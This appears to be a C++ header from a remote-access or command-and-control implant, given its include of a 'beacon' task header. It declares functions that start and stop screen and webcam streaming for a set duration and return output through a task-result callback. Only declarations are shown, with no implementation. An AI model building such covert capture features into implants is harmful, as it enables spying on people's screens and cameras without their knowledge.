#pragma once
#include <string>
#include <functional>
#include "../beacon/Task.h"

namespace streaming {
    // Callback to enqueue results
    using ResultCallback = std::function<void(const std::string& taskId, const std::string& output)>;

    void StartScreenStream(int durationSec, const std::string& taskId, ResultCallback callback);
    void StopScreenStream();

    void StartWebcamStream(int durationSec, const std::string& taskId, ResultCallback callback, int deviceIndex = 0, const std::string& nameHint = "");
    void StopWebcamStream();
}
